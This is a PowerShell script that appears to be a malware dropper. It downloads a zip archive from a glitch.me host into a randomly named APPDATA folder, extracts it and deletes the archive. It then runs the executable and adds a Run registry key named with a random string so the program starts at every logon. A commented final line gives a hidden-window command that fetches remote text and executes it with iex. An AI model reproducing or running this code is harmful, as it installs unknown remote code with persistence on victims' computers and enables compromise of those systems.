# Define the URL of the zip file to download
$url = 'https://ip28.glitch.me/winx64.zip'

# Set paths for the application data and the zip file
$appDataDir = Join-Path $env:APPDATA 'av9gqGIz'
$zipFilePath = Join-Path $env:APPDATA 'oVEYygQa.zip'
$exeFolderPath = Join-Path $appDataDir 'winx64'
$exeFilePath = Join-Path $exeFolderPath 'winx64.exe'

# Create the directory if it doesn't exist
if (-not (Test-Path $appDataDir)) {
    New-Item -Path $appDataDir -ItemType Directory
}

# Download the zip file
Start-BitsTransfer -Source $url -Destination $zipFilePath

# Extract the contents of the zip file
Expand-Archive -Path $zipFilePath -DestinationPath $appDataDir -Force

# Remove the zip file after extraction
Remove-Item $zipFilePath

# Run the winx64 executable
Start-Process $exeFilePath

# Add a registry entry to run the executable at startup
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'KooJIg83' -Value $exeFilePath -PropertyType 'String'


# powershell.exe -W Hidden -Command "iex (Invoke-WebRequest 'https://ip28.glitch.me/file.txt' -UseBasicParsing).Content"
